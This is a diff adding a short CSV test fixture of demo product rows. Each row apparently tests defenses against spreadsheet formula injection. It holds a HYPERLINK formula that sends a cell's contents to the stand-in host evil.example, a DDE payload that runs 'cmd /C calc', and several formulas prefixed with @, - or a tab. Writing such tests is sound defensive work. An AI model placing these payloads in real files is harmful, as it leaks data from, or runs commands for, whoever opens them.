@@ -1,0 +1,5 @@
+sku,name,description,category,price,stock
+IMPDEMO-301,"=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")",Formula in name,Test,5.00,1
+IMPDEMO-302,+cmd|' /C calc'!A0,Plus prefix,Test,5.00,1
+IMPDEMO-303,@SUM(1+1) Gadget,At prefix,=1+1,5.00,1
+IMPDEMO-304,-2+3 Gizmo,"	=tab then formula",Test,5.00,1
